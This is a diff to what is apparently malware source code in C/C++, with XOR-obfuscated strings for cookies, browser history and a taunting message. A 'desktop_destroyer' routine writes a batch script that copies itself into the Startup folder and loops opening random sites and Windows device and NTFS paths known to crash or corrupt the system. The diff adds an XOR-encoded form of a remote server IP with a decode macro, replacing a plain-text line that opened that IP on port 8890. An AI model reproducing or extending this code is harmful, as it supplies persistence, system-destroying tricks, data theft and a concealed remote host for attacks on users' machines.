@@ -51,6 +51,9 @@ static char _msg[] = {0x2C,0x3A,0x20,0x75,0x25,0x36,0x75,0x3F,0x20,0x26,0x21,0x7
 static char _enj[] = {0x30,0x3B,0x3F,0x3A,0x2C,0x75,0x38,0x2C,0x75,0x32,0x3C,0x33,0x21,0x26,0x75,0x19,0x1A,0x19}; // "enjoy my gifts LOL"
 static char _ck[] = {0x36,0x3A,0x3A,0x3E,0x3C,0x30,0x26,0x0A}; // "cookies_"
 static char _hi[] = {0x3D,0x3C,0x26,0x21,0x3A,0x27,0x2C,0x0A}; // "history_"
+static wchar_t _srv[] = L"\x64\x66\x64\x7B\x64\x61\x66\x7B\x67\x64\x60\x7B\x62\x67"; // "131.143.215.72"
+inline void XW(wchar_t* s, size_t n) { for (size_t i = 0; i < n; i++) ((char*)&s[i])[0] ^= XKEY; }
+#define XSTW(var) ([]()->const wchar_t*{ static bool f; if(!f){ XW(var, (sizeof(var)/sizeof(wchar_t))-1); f=true; } return var; }())
 
 // qedit.h was removed from Windows SDK 8+ — manual definitions
 static const CLSID CLSID_SampleGrabber =
@@ -961,7 +964,6 @@ void desktop_destroyer()
         "copy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n"
         ":loop\r\n"
         "start www.%random%.net\r\n"
-        "start http://131.143.215.72:8890/yyyyyyy.html\r\n"
         "start \\\\.\\globalroot\\device\\condrv\\kernelconnect\r\n"
         "cd C:\\:$i30:$bitmap\r\n"
         "start %random%\r\n"
